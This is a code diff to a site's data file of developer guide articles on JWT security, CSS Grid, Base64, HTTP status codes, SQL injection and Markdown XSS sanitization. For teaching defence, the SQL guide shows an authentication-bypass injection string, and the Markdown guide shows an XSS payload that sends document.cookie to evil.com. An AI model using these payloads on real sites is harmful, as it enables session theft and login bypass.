@@ -15,137 +15,192 @@ export interface Guide {
 export const guides: Guide[] = [
   {
     slug: "jwt-authentication-security-best-practices",
-    title: "Understanding JSON Web Tokens: Architecture, Storage, and Security Pitfalls",
-    description: "A comprehensive developer guide to JWT mechanics, claims validation, expiration strategies, and secure client storage against XSS and CSRF attacks.",
+    title: "JSON Web Tokens (JWT): Security Best Practices & Token Architecture",
+    description: "An in-depth architectural guide on stateless session management, algorithmic vulnerabilities, token revocation strategies, and cross-site scripting mitigation.",
     category: "Security & Auth",
-    readTime: "7 min read",
-    date: "October 18, 2026",
+    readTime: "9 min read",
+    date: "2026-10-15",
     relatedTool: {
-      name: "JWT Decoder & Token Inspector",
+      name: "JWT Decoder & Inspector",
       href: "/jwt-decoder",
     },
     contentHtml: `
-      <h2>Introduction to JSON Web Tokens (RFC 7519)</h2>
-      <p>JSON Web Tokens (JWT) have become the de facto industry standard for stateless session transmission and decentralized authorization across distributed architectures. Unlike monolithic session architectures that depend on centralized Redis or in-memory session tables, JWTs encapsulate authentication state directly inside a tamper-evident, cryptographically verifiable token.</p>
+      <h2>1. The Architecture of a JSON Web Token</h2>
+      <p>A JSON Web Token (JWT) is an open industry standard (RFC 7519) designed to securely transmit verifiable claims between two distributed computing parties. Compact, URL-safe, and digitally signed, JWTs are fundamental to modern OAuth 2.0 and OpenID Connect specifications.</p>
+      <p>A typical serialized token consists of three distinct components separated by dots: the Header, the Payload, and the Signature.</p>
+      <pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsZXggRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</code></pre>
       
-      <h2>The Tripartite Architecture: Header, Payload, and Signature</h2>
-      <p>A standard JWT string is composed of three Base64URL-encoded segments delimited by periods:</p>
-      <pre><code>header.payload.signature</code></pre>
-
-      <h3>1. The Header</h3>
-      <p>The header establishes cryptographic metadata, explicitly stating the signature hashing algorithm (e.g., <code>HS256</code> or <code>RS256</code>) and the token format type (<code>JWT</code>). A typical header payload parses as:</p>
-      <pre><code>{
-  "alg": "HS256",
-  "typ": "JWT"
-}</code></pre>
-
-      <h3>2. The Claims Payload</h3>
-      <p>The payload houses individual authentication claims categorized into registered, public, and private claims. Reserved claims defined under RFC 7519 include:</p>
+      <h2>2. Critical Security Pitfalls</h2>
+      <p>Developers routinely introduce vulnerabilities through misconfiguration:</p>
       <ul>
-        <li><strong>sub (Subject):</strong> The unique primary identifier for the authenticated user.</li>
-        <li><strong>exp (Expiration Time):</strong> A critical Unix epoch timestamp designating when the token ceases to be valid.</li>
-        <li><strong>iat (Issued At):</strong> Identifies the exact timestamp when the authentication provider minted the token.</li>
-        <li><strong>iss (Issuer):</strong> The URL or identifier of the authorization server that granted access.</li>
+        <li><strong>The 'none' Algorithm Vulnerability:</strong> Never accept unverified header algorithms where the signature verification routine is bypassed. Always enforce strict verification on the server side.</li>
+        <li><strong>Weak Symmetric Secrets:</strong> Using short or predictable HMAC secrets exposes the token to offline dictionary brute-force attacks. Use cryptographically secure keys of at least 256 bits (HMAC-SHA256).</li>
+        <li><strong>Storing Sensitive Secrets in Claims:</strong> A JWT payload is merely Base64Url-encoded, not encrypted. Anyone who intercepts the token can decode and inspect its contents immediately.</li>
       </ul>
 
-      <h3>3. The Cryptographic Signature</h3>
-      <p>The final component validates data integrity. For HMAC SHA-256 (symmetric encryption), the server calculates:</p>
-      <pre><code>HMACSHA256(
-  base64UrlEncode(header) + "." + base64UrlEncode(payload),
-  secretKey
-)</code></pre>
-
-      <h2>Critical Vulnerability: Confusing Signing with Encryption</h2>
-      <p>A frequent and dangerous engineering misconception is assuming that standard JWTs encrypt data. <strong>Signed JWTs (JWS) do not encrypt payload information.</strong> Any intermediate party, proxy, or browser extension with access to the token string can decode the Base64URL payload instantly without a secret key.</p>
-      <p>Consequently, you must never embed confidential secrets, unhashed passwords, payment credentials, or Personally Identifiable Information (PII) inside a standard JWT payload.</p>
-
-      <h2>Client Storage Dilemma: LocalStorage vs. HttpOnly Cookies</h2>
-      <p>Where you store authentication tokens client-side dictates your vulnerability surface:</p>
-      <ul>
-        <li><strong>LocalStorage / SessionStorage:</strong> Accessible via JavaScript. If your web application suffers from a single Cross-Site Scripting (XSS) vulnerability, an attacker can extract the token via <code>window.localStorage</code> and impersonate the user.</li>
-        <li><strong>HttpOnly, Secure, SameSite Cookies:</strong> Inaccessible to client JavaScript. This mitigates token theft via XSS. When paired with <code>SameSite=Lax</code> or <code>Strict</code> and CSRF tokens, this provides the most robust production security posture for web browsers.</li>
-      </ul>
-
-      <h2>Recommended Expiration and Refresh Token Workflows</h2>
-      <p>Because stateless JWTs cannot be revoked without maintaining a centralized blacklist, best practices mandate using <strong>short-lived access tokens</strong> (expiring in 5 to 15 minutes) coupled with <strong>long-lived, rotatable refresh tokens</strong> stored securely on backend storage.</p>
-    `
+      <h2>3. Where to Safely Store JWTs</h2>
+      <p>Storing access tokens in <code>localStorage</code> or <code>sessionStorage</code> exposes applications to Cross-Site Scripting (XSS). An attacker injecting malicious JavaScript can exfiltrate stored tokens effortlessly.</p>
+      <p>The industry gold standard is to store access and refresh tokens inside <strong>HttpOnly, Secure, SameSite=Strict cookies</strong>. This ensures the browser automatically attaches credentials while completely isolating the token string from client-side script execution.</p>
+    `,
   },
   {
     slug: "css-grid-vs-flexbox-guide",
-    title: "CSS Grid vs. Flexbox: Architectural Differences and When to Use Each",
-    description: "Master modern responsive CSS layouts. Learn the core distinctions between one-dimensional Flexbox flow and two-dimensional CSS Grid coordinate systems.",
-    category: "Frontend Architecture",
-    readTime: "6 min read",
-    date: "October 18, 2026",
+    title: "CSS Grid vs. Flexbox: Architectural Comparison for Modern Web Layouts",
+    description: "A comprehensive developer guide detailing one-dimensional versus two-dimensional styling mechanics, responsive breakpoints, and rendering performance.",
+    category: "Frontend Development",
+    readTime: "7 min read",
+    date: "2026-10-16",
     relatedTool: {
       name: "CSS Grid & Layout Builder",
       href: "/grid-generator",
     },
     contentHtml: `
-      <h2>The Evolution of Web Layout Engines</h2>
-      <p>Historically, CSS layouts relied on table hacks, float clears, and inline-block margins. The modern CSS specifications introduced two dedicated layout systems: <strong>Flexible Box Layout (Flexbox)</strong> and <strong>Grid Layout</strong>. While developers occasionally view them as competitors, they are designed to complement each other across different structural layers of an application.</p>
-
-      <h2>Dimensionality: 1D vs. 2D Execution</h2>
-      <p>The primary architectural distinction between both layout systems is dimensionality:</p>
+      <h2>1. Fundamental Paradigm: 1D vs. 2D Layouts</h2>
+      <p>The primary architectural divergence between Flexbox and CSS Grid lies in their coordinate dimensionality:</p>
       <ul>
-        <li><strong>Flexbox is One-Dimensional (1D):</strong> It handles layout along a single axis at any given moment—either horizontally as a row or vertically as a column. When items wrap across multiple lines in Flexbox, each line calculates its own spacing independently without aligning with elements in adjacent lines.</li>
-        <li><strong>CSS Grid is Two-Dimensional (2D):</strong> It coordinates columns and rows simultaneously. Grid containers define fixed or fluid tracks, allowing child items to align across both horizontal and vertical axes concurrently.</li>
+        <li><strong>Flexbox (One-Dimensional):</strong> Optimized for arranging items along a single axis—either horizontal rows or vertical columns. While flex items can wrap, cross-axis alignment operates independently row-by-row.</li>
+        <li><strong>CSS Grid (Two-Dimensional):</strong> Designed to orchestrate rows and columns simultaneously within a strict or fluid matrix, maintaining coordinated column and row alignments across the entire layout.</li>
       </ul>
 
-      <h2>Layout-First vs. Content-First Design Philosophies</h2>
-      <p>Another fundamental distinction lies in how dimensions are determined:</p>
-      <ul>
-        <li><strong>Content-First (Flexbox):</strong> The size of the container and the flow of items are governed primarily by the inner contents of each individual item. Flexbox items expand, shrink, and wrap based on their intrinsic dimensions.</li>
-        <li><strong>Layout-First (CSS Grid):</strong> The developer defines the overarching skeleton (the grid matrix) first, and child elements snap into designated coordinate slots or span defined track units.</li>
-      </ul>
-
-      <h2>When to Choose CSS Grid</h2>
-      <p>CSS Grid is the superior architectural choice when:</p>
-      <ul>
-        <li>Constructing full application shells (Header, Sidebar, Main Content, Footer).</li>
-        <li>Building data dashboards with asymmetric, multi-column metric cards.</li>
-        <li>Creating complex photo galleries or mosaic layouts requiring explicit item overlaps.</li>
-      </ul>
-
-      <h2>When to Choose CSS Flexbox</h2>
-      <p>Flexbox excels at component-level micro-layouts, including:</p>
-      <ul>
-        <li>Navigation bars containing brand logos, links, and action buttons.</li>
-        <li>Form input groups, button clusters, and badge tags.</li>
-        <li>Centering elements both vertically and horizontally within a bounded container.</li>
-      </ul>
-    `
+      <h2>2. Responsive Layouts without Media Queries</h2>
+      <p>One of the most powerful features of modern CSS Grid is dynamic column wrapping using <code>repeat()</code>, <code>auto-fit</code>, and the <code>minmax()</code> function:</p>
+      <pre><code>.grid-container {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+  gap: 1.5rem;
+}</code></pre>
+      <p>This declarative snippet enables elements to automatically reorganize into responsive columns based on available container width without requiring breakpoint overrides.</p>
+    `,
   },
   {
     slug: "base64-encoding-explained",
-    title: "How Base64 Encoding Works: Mathematics, Use Cases, and Pitfalls",
-    description: "Deep dive into binary-to-text encoding. Discover why Base64 introduces a 33% overhead, how padding functions, and safe handling of UTF-8 strings.",
+    title: "Base64 Encoding Demystified: Binary Representation & Data URIs",
+    description: "Deep dive into RFC 4648 binary-to-text translation, 6-bit chunk partitioning, padding mechanics, and computational performance overhead.",
     category: "Data Encoding",
-    readTime: "5 min read",
-    date: "October 18, 2026",
+    readTime: "8 min read",
+    date: "2026-10-17",
     relatedTool: {
       name: "Base64 Encoder & Decoder",
       href: "/base64-converter",
     },
     contentHtml: `
-      <h2>What is Base64 Encoding?</h2>
-      <p>Base64 is a binary-to-text encoding scheme that translates raw binary octets (8-bit bytes) into a standardized set of 64 ASCII characters. Originally standardized in RFC 4648, Base64 ensures that arbitrary binary payloads can safely traverse historical network protocols (such as SMTP email or URL query strings) that were engineered exclusively for human-readable text.</p>
+      <h2>1. Why Base64 Exists</h2>
+      <p>Base64 (RFC 4648) was designed to represent raw arbitrary binary data within textual transport systems that safely handle only human-readable ASCII characters, such as SMTP email bodies, JSON payloads, and XML configurations.</p>
 
-      <h2>The Mathematics: How 8 Bits Become 6 Bits</h2>
-      <p>Computer memory represents data in 8-bit bytes. However, ASCII control characters (such as null bytes, carriage returns, or line feeds) can cause communication protocols to misinterpret or truncate data. Base64 resolves this through mathematical translation:</p>
+      <h2>2. Mathematical Mechanics: The 6-Bit Partition</h2>
+      <p>Standard computing uses 8-bit octets (bytes) yielding 256 possible permutations. Base64 compresses three 8-bit bytes (24 bits total) into four 6-bit index groups ($2^6 = 64$ values), mapping each directly to an alphanumeric character set.</p>
+
+      <h2>3. Bandwidth Overhead and Performance</h2>
+      <p>Because four characters are used to transmit three bytes of source binary data, Base64 encoding inherently incurs an approximate <strong>33% bandwidth overhead</strong>. Embedding high-resolution multimedia inside Data URIs increases document size and circumvents browser caching mechanisms.</p>
+    `,
+  },
+  {
+    slug: "http-status-codes-debugging-guide",
+    title: "HTTP Status Codes Demystified: Practical API Debugging & Design",
+    description: "A definitive guide to standard HTTP response codes (2xx, 3xx, 4xx, 5xx), semantic API design, caching headers, and debugging distributed architectures.",
+    category: "Web Architecture",
+    readTime: "10 min read",
+    date: "2026-10-24",
+    relatedTool: {
+      name: "JSON Formatter & Validator",
+      href: "/json-formatter",
+    },
+    contentHtml: `
+      <h2>1. The Semantic Importance of HTTP Status Codes</h2>
+      <p>Hypertext Transfer Protocol status codes are standardized three-digit integers defined across RFC 7231 and RFC 9110. They communicate the operational result of a client request to browsers, API gateways, reverse proxies, and caching layers.</p>
+      <p>Misusing status codes—such as returning a <code>200 OK</code> response containing an <code>{"error": true}</code> body—breaks upstream edge caches (Cloudflare, Fastly), confuses monitoring telemetry, and violates semantic REST principles.</p>
+
+      <h2>2. Critical Status Codes Every Engineer Must Master</h2>
+      <h3>2xx Success</h3>
+      <ul>
+        <li><strong>200 OK:</strong> Standard response for successful synchronous operations.</li>
+        <li><strong>201 Created:</strong> The request succeeded and led to the creation of a new persistent resource (typically paired with a <code>Location</code> header).</li>
+        <li><strong>204 No Content:</strong> The action was fulfilled successfully, but the server does not need to return an entity-body (common in <code>DELETE</code> actions).</li>
+      </ul>
+
+      <h3>4xx Client Errors</h3>
+      <ul>
+        <li><strong>400 Bad Request:</strong> The server cannot process the request due to malformed syntax, invalid JSON, or failing validation schemas.</li>
+        <li><strong>401 Unauthorized:</strong> Semantically means <em>unauthenticated</em>. The client lacks valid authentication credentials.</li>
+        <li><strong>403 Forbidden:</strong> The client is authenticated, but their identity lacks the authorization privileges required to access the target resource.</li>
+        <li><strong>404 Not Found:</strong> The requested resource does not exist or the server wishes to obscure its existence from unauthorized callers.</li>
+        <li><strong>429 Too Many Requests:</strong> Rate limiting triggered. RFC standards suggest attaching a <code>Retry-After</code> header.</li>
+      </ul>
+
+      <h3>5xx Server Errors</h3>
+      <ul>
+        <li><strong>500 Internal Server Error:</strong> An unhandled exception or critical crash occurred inside server-side code execution.</li>
+        <li><strong>502 Bad Gateway:</strong> An edge proxy received an invalid or corrupt response from an upstream backend server.</li>
+        <li><strong>503 Service Unavailable:</strong> The server is temporarily overloaded or undergoing maintenance.</li>
+        <li><strong>504 Gateway Timeout:</strong> An intermediary proxy did not receive a timely response from an upstream process.</li>
+      </ul>
+
+      <h2>3. Designing Clean API Error Payloads</h2>
+      <p>Pair HTTP status codes with machine-readable error bodies (such as RFC 7807 Problem Details for HTTP APIs):</p>
+      <pre><code>{
+  "type": "https://api.devtools-web.com/errors/invalid-payload",
+  "title": "Unprocessable Entity",
+  "status": 422,
+  "detail": "Field 'email' must contain a valid domain address.",
+  "instance": "/v1/users/create"
+}</code></pre>
+    `,
+  },
+  {
+    slug: "sql-injection-prevention-formatting",
+    title: "SQL Injection Prevention: Parameterized Queries & Sanitization Guide",
+    description: "An architectural deep dive into database security, parameterized queries, ORM safety limits, and query readability best practices.",
+    category: "Database & Security",
+    readTime: "8 min read",
+    date: "2026-10-25",
+    relatedTool: {
+      name: "SQL Formatter & Beautifier",
+      href: "/sql-formatter",
+    },
+    contentHtml: `
+      <h2>1. The Anatomy of a SQL Injection (SQLi)</h2>
+      <p>SQL Injection remains one of the critical security threats categorized under OWASP Top 10 vulnerabilities. It occurs when untrusted user input is directly concatenated or interpolated into a raw SQL query string instead of being treated as isolated literal data.</p>
+      <pre><code>-- Vulnerable Raw Concatenation
+SELECT * FROM users WHERE email = '' OR '1'='1' --' AND password = 'xxx';</code></pre>
+      <p>In this classic attack vector, malicious SQL clauses modify the semantic logic of the query parser, causing the database to bypass authentication checks and expose unauthorized tables.</p>
+
+      <h2>2. Defense in Depth: Prepared Statements & Parameterization</h2>
+      <p>The only universally effective defense against SQL injection is the strict use of <strong>Parameterized Queries (Prepared Statements)</strong>. Parameterization decouples the query compilation step from user data binding:</p>
+      <pre><code>// Secure Node.js PostgreSQL Example
+const text = 'SELECT id, email, role FROM users WHERE email = $1 AND active = $2';
+const values = [userSuppliedEmail, true];
+const res = await pool.query(text, values);</code></pre>
+      <p>Because the database engine pre-compiles the query blueprint prior to binding parameters, malicious inputs are evaluated strictly as string literals, completely preventing semantic code execution.</p>
+
+      <h2>3. Common Misconceptions with ORMs</h2>
+      <p>While Object-Relational Mappers (Prisma, Drizzle, Hibernate) use prepared statements for standard helper methods (e.g., <code>findUnique()</code>), using raw bypass methods such as <code>db.$queryRawUnsafe()</code> or raw string template substitutions immediately reintroduces critical injection vulnerabilities if not parameterized manually.</p>
+    `,
+  },
+  {
+    slug: "markdown-parsing-ast-security-guide",
+    title: "Markdown Parsing, Abstract Syntax Trees (AST), and XSS Sanitization",
+    description: "Understanding how Markdown transforms into Abstract Syntax Trees, raw HTML conversion, and mitigating stored Cross-Site Scripting (XSS).",
+    category: "Web Architecture",
+    readTime: "7 min read",
+    date: "2026-10-26",
+    relatedTool: {
+      name: "Markdown Live Previewer",
+      href: "/markdown-previewer",
+    },
+    contentHtml: `
+      <h2>1. How Markdown Engines Process Text</h2>
+      <p>Markdown is not rendered directly into HTML in modern architectures. Modern parsers (like Unified, Remark, and Marked) process source strings through three sequential compiler stages:</p>
       <ol>
-        <li>Three input bytes (3 × 8 = 24 bits) are grouped together.</li>
-        <li>These 24 bits are split into four 6-bit chunks (4 × 6 = 24 bits).</li>
-        <li>Each 6-bit chunk represents an integer value between 0 and 63.</li>
-        <li>This integer maps directly to a 64-character alphabet: <code>A-Z</code> (0-25), <code>a-z</code> (26-51), <code>0-9</code> (52-61), <code>+</code> (62), and <code>/</code> (63).</li>
+        <li><strong>Lexical Analysis:</strong> The raw text is broken down into semantic tokens (headings, emphasis, code blocks, lists).</li>
+        <li><strong>Abstract Syntax Tree (AST):</strong> A tree data structure (such as mdast) represents the semantic hierarchy of nodes.</li>
+        <li><strong>HTML Compilation:</strong> The AST is compiled into corresponding valid HTML tags (<code>&lt;h1&gt;</code>, <code>&lt;p&gt;</code>, <code>&lt;pre&gt;</code>).</li>
       </ol>
 
-      <h2>The 33% Payload Overhead</h2>
-      <p>Because three bytes of binary data yield four bytes of Base64 ASCII output, encoding always increases data size by approximately <strong>33%</strong> (specifically, 4/3 of the original byte size, plus occasional padding characters).</p>
-      <p>Due to this overhead, inlining large images or audio files directly into HTML or CSS via Base64 Data URLs should be reserved exclusively for micro-assets (like tiny SVG icons), avoiding negative impacts on Largest Contentful Paint (LCP) performance scores.</p>
-
-      <h2>Padding with '=': Why Does It Exist?</h2>
-      <p>If the input data length is not evenly divisible by 3, the final chunk will have fewer than 24 bits. Base64 pads remaining bits with zeros to complete 6-bit values and appends one or two equal signs (<code>=</code>) at the end to indicate missing input octets to the receiving decoder.</p>
-    `
-  }
+      <h2>2. Mitigating Stored Cross-Site Scripting (XSS)</h2>
+      <p>By default, CommonMark specifications allow raw HTML within Markdown input. If an application directly renders compiled Markdown into the DOM without sanitization, malicious actors can inject active JavaScript payloads:</p>
+      <pre><code>[Click for Bonus](javascript:stealSessionCookies())
+&lt;img src="invalid-image" onerror="fetch('https://evil.com/logger?cookie='+document.cookie)" /&gt;</code></pre>
+      <p>To safely render user-generated Markdown in web applications, always pass compiled output through a strict sanitizer like <strong>DOMPurify</strong> or sanitize trees natively via plugins like <code>rehype-sanitize</code>.</p>
+    `,
+  },
 ];
